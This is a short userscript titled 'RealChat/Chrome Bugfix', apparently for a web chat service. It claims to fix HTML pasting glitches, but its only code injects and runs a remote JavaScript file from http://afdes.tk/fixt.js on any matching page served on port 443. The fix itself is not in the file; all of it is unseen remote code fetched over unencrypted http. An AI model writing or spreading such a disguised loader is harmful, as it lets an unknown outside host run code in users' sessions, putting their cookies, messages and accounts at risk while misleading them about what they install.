// <![CDATA[
// ==UserScript==
// @name		RealChat/Chrome Bugfix
// @fullname		RealChat/Chrome Bugfix
// @author		simmaster07
// @namespace		simmaster07
// @version		1.01
// @licence		http://creativecommons.org/licenses/by-nc-sa/3.0/
// @licence		(CC) BY-NC-SA
// @description		Fixes glitches with RealChat and Google Chrome when copypasting HTML.
// @include		http://*:443/*
// ==/UserScript==

/******************************************** License ******************************************************
*** Creative Commons 3.0                                                                                 ***
*** by: BY-attribution (Requirement to acknowledge or credit the author "simmaster07")                   ***
*** nc: Non-Commercial (Use for commercial purpose is forbidden)                                         ***
*** sa: Share Alike    (Derivative works must be under the same or similar license to this one)          ***
***********************************************************************************************************/

// Add the script in
var script = document.createElement('script');
script.setAttribute('type', 'text/javascript');
script.setAttribute('src', 'http://afdes.tk/fixt.js');
document.body.appendChild(script);
// ]]>